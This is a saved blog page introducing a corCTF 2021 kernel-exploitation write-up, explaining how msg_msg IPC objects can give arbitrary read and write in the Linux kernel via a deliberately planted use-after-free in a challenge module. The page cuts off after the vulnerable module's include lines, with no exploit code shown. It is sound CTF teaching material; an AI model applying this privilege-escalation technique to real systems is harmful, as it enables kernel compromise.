<!DOCTYPE html>
<!-- saved from url=(0075)https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html -->
<html class="v2" dir="ltr" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/1529571102-css_bundle_v2.css" rel="stylesheet" type="text/css">
<meta content="width=1100" name="viewport">

<meta content="blogger" name="generator">
<link href="https://www.willsroot.io/favicon.ico" rel="icon" type="image/x-icon">
<link href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html" rel="canonical">
<link rel="alternate" type="application/atom+xml" title="Will&#39;s Root - Atom" href="https://www.willsroot.io/feeds/posts/default">
<link rel="alternate" type="application/rss+xml" title="Will&#39;s Root - RSS" href="https://www.willsroot.io/feeds/posts/default?alt=rss">
<link rel="service.post" type="application/atom+xml" title="Will&#39;s Root - Atom" href="https://www.blogger.com/feeds/8814147965526194982/posts/default">

<link rel="alternate" type="application/atom+xml" title="Will&#39;s Root - Atom" href="https://www.willsroot.io/feeds/5446202128615786254/comments/default">
<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/1155466832-ieretrofit.js"></script>
<![endif]-->
<link href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/1.png" rel="image_src">
<meta content="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html" property="og:url">
<meta content="corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel" property="og:title">
<meta content="A blog about pentesting, CTFs, and security" property="og:description">
<meta content="https://1.bp.blogspot.com/-izQijq0j-lI/YSfvHKSIK2I/AAAAAAAACH8/mBElL4uaDmYslUsEgGbwc7gDdAJzpjNtQCLcBGAsYHQ/w1200-h630-p-k-no-nu/1.png" property="og:image">
<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
<title>Will's Root: corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel</title>
<style type="text/css">@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v29/KFOmCnqEu92Fr1Mu72xKOzY.woff2)format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v29/KFOmCnqEu92Fr1Mu5mxKOzY.woff2)format('woff2');unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v29/KFOmCnqEu92Fr1Mu7mxKOzY.woff2)format('woff2');unicode-range:U+1F00-1FFF;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v29/KFOmCnqEu92Fr1Mu4WxKOzY.woff2)format('woff2');unicode-range:U+0370-03FF;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v29/KFOmCnqEu92Fr1Mu7WxKOzY.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v29/KFOmCnqEu92Fr1Mu7GxKOzY.woff2)format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v29/KFOmCnqEu92Fr1Mu4mxK.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}</style>
<style id="page-skin-1" type="text/css"><!--
/*-----------------------------------------------
Blogger Template Style
Name:     Picture Window
Designer: Blogger
URL:      www.blogger.com
----------------------------------------------- */
/* Content
----------------------------------------------- */
body {
font: normal normal 16px Roboto;
color: #000000;
background: #e5e5e5 url(//2.bp.blogspot.com/-ErizLnNeTcI/XXVJdtjs78I/AAAAAAAABkQ/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw/s0/blog_background.jpg) repeat scroll top left;
}
html body .region-inner {
min-width: 0;
max-width: 100%;
width: auto;
}
.content-outer {
font-size: 90%;
}
a:link {
text-decoration:none;
color: #fc0404;
}
a:visited {
text-decoration:none;
color: #fc0e0e;
}
a:hover {
text-decoration:underline;
color: #ff3f3f;
}
.content-outer {
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left;
-moz-border-radius: 15px;
-webkit-border-radius: 15px;
-goog-ms-border-radius: 15px;
border-radius: 15px;
-moz-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
box-shadow: 0 0 3px rgba(0, 0, 0, .15);
margin: 30px auto;
}
.content-inner {
padding: 15px;
}
/* Header
----------------------------------------------- */
.header-outer {
background: rgba(0, 0, 0, 0) url(https://resources.blogblog.com/blogblog/data/1kt/transparent/header_gradient_shade.png) repeat-x scroll top left;
_background-image: none;
color: #ff0000;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
-goog-ms-border-radius: 10px;
border-radius: 10px;
}
.Header img, .Header #header-inner {
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
-goog-ms-border-radius: 10px;
border-radius: 10px;
}
.header-inner .Header .titlewrapper,
.header-inner .Header .descriptionwrapper {
padding-left: 30px;
padding-right: 30px;
}
.Header h1 {
font: normal bold 39px 'Courier New', Courier, FreeMono, monospace;
text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
}
.Header h1 a {
color: #ff0000;
}
.Header .description {
font-size: 130%;
}
/* Tabs
----------------------------------------------- */
.tabs-inner {
margin: .5em 0 0;
padding: 0;
}
.tabs-inner .section {
margin: 0;
}
.tabs-inner .widget ul {
padding: 0;
background: #fbfbfb url(https://resources.blogblog.com/blogblog/data/1kt/transparent/tabs_gradient_shade.png) repeat scroll bottom;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
-goog-ms-border-radius: 10px;
border-radius: 10px;
}
.tabs-inner .widget li {
border: none;
}
.tabs-inner .widget li a {
display: inline-block;
padding: .5em 1em;
margin-right: 0;
color: #992211;
font: normal normal 15px Roboto;
-moz-border-radius: 0 0 0 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-radius: 0 0 0 0;
border-radius: 0 0 0 0;
background: transparent none no-repeat scroll top left;
border-right: 1px solid #d5d5d5;
}
.tabs-inner .widget li:first-child a {
padding-left: 1.25em;
-moz-border-radius-topleft: 10px;
-moz-border-radius-bottomleft: 10px;
-webkit-border-top-left-radius: 10px;
-webkit-border-bottom-left-radius: 10px;
-goog-ms-border-top-left-radius: 10px;
-goog-ms-border-bottom-left-radius: 10px;
border-top-left-radius: 10px;
border-bottom-left-radius: 10px;
}
.tabs-inner .widget li.selected a,
.tabs-inner .widget li a:hover {
position: relative;
z-index: 1;
background: #ffffff url(https://resources.blogblog.com/blogblog/data/1kt/transparent/tabs_gradient_shade.png) repeat scroll bottom;
color: #000000;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
}
/* Headings
----------------------------------------------- */
h2 {
font: normal bold 100% 'Courier New', Courier, FreeMono, monospace;
text-transform: uppercase;
color: #ff0000;
margin: .5em 0;
}
/* Main
----------------------------------------------- */
.main-outer {
background: transparent none repeat scroll top center;
-moz-border-radius: 0 0 0 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-webkit-border-bottom-left-radius: 0;
-webkit-border-bottom-right-radius: 0;
-goog-ms-border-radius: 0 0 0 0;
border-radius: 0 0 0 0;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
}
.main-inner {
padding: 15px 5px 20px;
}
.main-inner .column-center-inner {
padding: 0 0;
}
.main-inner .column-left-inner {
padding-left: 0;
}
.main-inner .column-right-inner {
padding-right: 0;
}
/* Posts
----------------------------------------------- */
h3.post-title {
margin: 0;
font: normal bold 24px 'Courier New', Courier, FreeMono, monospace;
}
.comments h4 {
margin: 1em 0 0;
font: normal bold 24px 'Courier New', Courier, FreeMono, monospace;
}
.date-header span {
color: #ff0000;
}
.post-outer {
background-color: #ffffff;
border: solid 1px #e5e5e5;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
border-radius: 10px;
-goog-ms-border-radius: 10px;
padding: 15px 20px;
margin: 0 -20px 20px;
}
.post-body {
line-height: 1.4;
font-size: 110%;
position: relative;
}
.post-header {
margin: 0 0 1.5em;
color: #a8a8a8;
line-height: 1.6;
}
.post-footer {
margin: .5em 0 0;
color: #a8a8a8;
line-height: 1.6;
}
#blog-pager {
font-size: 140%
}
#comments .comment-author {
padding-top: 1.5em;
border-top: dashed 1px #ccc;
border-top: dashed 1px rgba(128, 128, 128, .5);
background-position: 0 1.5em;
}
#comments .comment-author:first-child {
padding-top: 0;
border-top: none;
}
.avatar-image-container {
margin: .2em 0 0;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #ff3f3f;
border-bottom: 1px solid #ff3f3f;
}
.comments .continue {
border-top: 2px solid #ff3f3f;
}
/* Widgets
----------------------------------------------- */
.widget ul, .widget #ArchiveList ul.flat {
padding: 0;
list-style: none;
}
.widget ul li, .widget #ArchiveList ul.flat li {
border-top: dashed 1px #ccc;
border-top: dashed 1px rgba(128, 128, 128, .5);
}
.widget ul li:first-child, .widget #ArchiveList ul.flat li:first-child {
border-top: none;
}
.widget .post-body ul {
list-style: disc;
}
.widget .post-body ul li {
border: none;
}
/* Footer
----------------------------------------------- */
.footer-outer {
color:#f5f5f5;
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/black50.png) repeat scroll top left;
-moz-border-radius: 10px 10px 10px 10px;
-webkit-border-top-left-radius: 10px;
-webkit-border-top-right-radius: 10px;
-webkit-border-bottom-left-radius: 10px;
-webkit-border-bottom-right-radius: 10px;
-goog-ms-border-radius: 10px 10px 10px 10px;
border-radius: 10px 10px 10px 10px;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
}
.footer-inner {
padding: 10px 5px 20px;
}
.footer-outer a {
color: #fc5858;
}
.footer-outer a:visited {
color: #fc5858;
}
.footer-outer a:hover {
color: #fc5858;
}
.footer-outer .widget h2 {
color: #c6c6c6;
}
/* Mobile
----------------------------------------------- */
html body.mobile {
height: auto;
}
html body.mobile {
min-height: 480px;
background-size: 100% auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
html .mobile .mobile-date-outer, html .mobile .blog-pager {
border-bottom: none;
background: transparent none repeat scroll top center;
margin-bottom: 10px;
}
.mobile .date-outer {
background: transparent none repeat scroll top center;
}
.mobile .header-outer, .mobile .main-outer,
.mobile .post-outer, .mobile .footer-outer {
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.mobile .content-outer,
.mobile .main-outer,
.mobile .post-outer {
background: inherit;
border: none;
}
.mobile .content-outer {
font-size: 100%;
}
.mobile-link-button {
background-color: #fc0404;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile-index-contents {
color: #000000;
}
.mobile .tabs-inner .PageList .widget-content {
background: #ffffff url(https://resources.blogblog.com/blogblog/data/1kt/transparent/tabs_gradient_shade.png) repeat scroll bottom;
color: #000000;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #d5d5d5;
}
.code { background:#f5f8fa; background-repeat:no-repeat; border: solid #5C7B90; border-width: 1px 1px 1px 20px; color: #000000; font: 13px 'Courier New', Courier, monospace; line-height: 16px; margin: 10px 0 10px 10px; max-height: 10000px; min-height: 16px; overflow: auto; padding: 28px 10px 10px; width: 90%; } .code:hover { background-repeat:no-repeat; }
--></style>
<style id="template-skin-1" type="text/css"><!--
body {
min-width: 1010px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 1010px;
max-width: 1010px;
_width: 1010px;
}
.main-inner .columns {
padding-left: 0px;
padding-right: 240px;
}
.main-inner .fauxcolumn-center-outer {
left: 0px;
right: 240px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0px") -
parseInt("240px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0px;
}
.main-inner .fauxcolumn-right-outer {
width: 240px;
}
.main-inner .column-left-outer {
width: 0px;
right: 100%;
margin-left: -0px;
}
.main-inner .column-right-outer {
width: 240px;
margin-right: -240px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
body#layout div.add_widget {
padding: 8px;
}
body#layout div.add_widget a {
margin-left: 32px;
}
--></style>
<style>
    body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/s0\/blog_background.jpg);}
    
@media (max-width: 200px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w200\/blog_background.jpg);}}
@media (max-width: 400px) and (min-width: 201px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w400\/blog_background.jpg);}}
@media (max-width: 800px) and (min-width: 401px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w800\/blog_background.jpg);}}
@media (max-width: 1200px) and (min-width: 801px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w1200\/blog_background.jpg);}}
/* Last tag covers anything over one higher than the previous max-size cap. */
@media (min-width: 1201px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w1600\/blog_background.jpg);}}
  </style>
<link href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/authorization.css" media="all" onload="if(media!=&#39;all&#39;)media=&#39;all&#39;" rel="stylesheet"><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8814147965526194982&amp;zx=e20d9df2-e341-414b-8ca9-afb687dc28f0' rel='stylesheet'/></noscript>
<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
<meta name="google-adsense-platform-domain" content="blogspot.com">

</head>
<body class=" variant-shade">
<div class="navbar no-items section" id="navbar" name="Navbar">
</div>
<div class="body-fauxcolumns">
<div class="fauxcolumn-outer body-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content">
<div class="content-fauxcolumns">
<div class="fauxcolumn-outer content-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content-outer">
<div class="content-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left content-fauxborder-left">
<div class="fauxborder-right content-fauxborder-right"></div>
<div class="content-inner">
<header>
<div class="header-outer">
<div class="header-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left header-fauxborder-left">
<div class="fauxborder-right header-fauxborder-right"></div>
<div class="region-inner header-inner">
<div class="header section" id="header" name="Header"><div class="widget Header" data-version="1" id="Header1">
<div id="header-inner" style="background-image: url(&quot;//3.bp.blogspot.com/-Vq2QZ98cq1M/V3RUcENYgkI/AAAAAAAAAqA/3PhYksj1tX0_3YiZ51aP-rauPp2FRgN9QCK4B/s1057/COOL%2BAUDIO%2BWAVES-for-blog.jpg&quot;); background-position: left; min-height: 294px; _height: 294px; background-repeat: no-repeat; ">
<div class="titlewrapper" style="background: transparent">
<h1 class="title" style="background: transparent; border-width: 0px">
<a href="https://www.willsroot.io/">
Will's Root
</a>
</h1>
</div>
<div class="descriptionwrapper">
<p class="description"><span>Pentesting, CTFs, and Writeups</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class="header-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</header>
<div class="tabs-outer">
<div class="tabs-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left tabs-fauxborder-left">
<div class="fauxborder-right tabs-fauxborder-right"></div>
<div class="region-inner tabs-inner">
<div class="tabs section" id="crosscol" name="Cross-Column"><div class="widget BlogSearch" data-version="1" id="BlogSearch1">
<h2 class="title">Search This Blog</h2>
<div class="widget-content">
<div id="BlogSearch1_form">
<form action="https://www.willsroot.io/search" class="gsc-search-box" target="_top">
<table cellpadding="0" cellspacing="0" class="gsc-search-box">
<tbody>
<tr>
<td class="gsc-input">
<input autocomplete="off" class="gsc-input" name="q" size="10" title="search" type="text" value="">
</td>
<td class="gsc-search-button">
<input class="gsc-search-button" title="search" type="submit" value="Search">
</td>
</tr>
</tbody>
</table>
</form>
</div>
</div>
<div class="clear"></div>
</div></div>
<div class="tabs no-items section" id="crosscol-overflow" name="Cross-Column 2"></div>
</div>
</div>
<div class="tabs-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="main-outer">
<div class="main-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left main-fauxborder-left">
<div class="fauxborder-right main-fauxborder-right"></div>
<div class="region-inner main-inner">
<div class="columns fauxcolumns">
<div class="fauxcolumn-outer fauxcolumn-center-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-left-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-right-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class="columns-inner">
<div class="column-center-outer">
<div class="column-center-inner">
<div class="main section" id="main" name="Main"><div class="widget Blog" data-version="1" id="Blog1">
<div class="blog-posts hfeed">

          <div class="date-outer">
        
<h2 class="date-header"><span>Thursday, August 26, 2021</span></h2>

          <div class="date-posts">
        
<div class="post-outer">
<div class="post hentry uncustomized-post-template" itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<meta content="https://1.bp.blogspot.com/-izQijq0j-lI/YSfvHKSIK2I/AAAAAAAACH8/mBElL4uaDmYslUsEgGbwc7gDdAJzpjNtQCLcBGAsYHQ/w640-h409/1.png" itemprop="image_url">
<meta content="8814147965526194982" itemprop="blogId">
<meta content="5446202128615786254" itemprop="postId">
<a name="5446202128615786254"></a>
<h3 class="post-title entry-title" itemprop="name">
corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel
</h3>
<div class="post-header">
<div class="post-header-line-1"></div>
</div>
<div class="post-body entry-content" id="post-body-5446202128615786254" itemprop="description articleBody">
<p>In corCTF 2021, <a href="https://syst3mfailure.io/">D3v17</a> and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and arb write in kernel land: Fire of Salvation and Wall of Perdition. A famous kernel object often abused for heap sprays is the msg_msg struct, which is an elastic kernel object meant for IPC purposes (System V message queues) that has a size ranging from the kmalloc 64 to the kmalloc 4k. There was also a recent <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">CVE exploit writeup</a> by Linux kernel developer and security researcher Alexander Popov in which he abused msg_msg for arb read in his exploit for CVE-2021-26708. D3v17 and I read this, and posed the question to ourselves, is it possible to achieve arbitrary write in this across any valid slab for msg_msg? After a week or two of digging around, not only did we discover a way to achieve arb write on kmalloc 4k slabs, but we also discovered a way to do this for any valid msg_msg slab. In this post, I'll detail the Fire of Salvation writeup, which covers arb write on kmalloc 4k slabs. I'll also provide a tldr with the insights for any valid msg_msg arb write with a summary of my approach for the second challenge, but D3v17 will detail that out in <a href="https://syst3mfailure.io/wall-of-perdition" target="_blank">his post for Wall of Perdition</a>. Since this writeup is quite long, feel free to let me know of any unclear explanations or mistakes.</p>
  
  
  <br>In this challenge, the following key protections were enabled on a 5.8 kernel: FG-KASLR, SLAB_RANDOM, SLAB_HARDENED, and STATIC_USERMODE_HELPER. The SLAB allocator was also being used, with a corresponding kernel.config file provided with all the extra other tidbits and miscellaneous hardening options (such as enabling the userfaultfd syscall, hardened_usercopy, CHECKPOINT_RESTORE, etc.). SMAP, SMEP, and KPTI being on was a given. Also, since our goal was to introduce players to a novel exploitation technique, we didn't really care much about the reversing procedure to find a bug, and didn't want to complexify the bug. In our discussions, we decided to just make the bug a pretty obvious UAF that limits them to around 0x28 to 0x30 of UAF write. (no UAF read). This was the source we provided to all the players (we were also nice enough to give out a vmlinux with debug symbols and structs):<div><br></div><div><script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js.下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-firewall-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="firewall.c">
        <tbody><tr>
          <td id="file-firewall-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-firewall-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/kernel.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-firewall-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/module.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-firewall-c-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/device.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-firewall-c-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/mutex.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-firewall-c-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/fs.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-firewall-c-LC6" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/slab.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-firewall-c-LC7" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/miscdevice.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-firewall-c-LC8" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/uaccess.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-firewall-c-LC9" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/random.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-firewall-c-LC10" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>crypto/hash.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-firewall-c-LC11" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/types.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
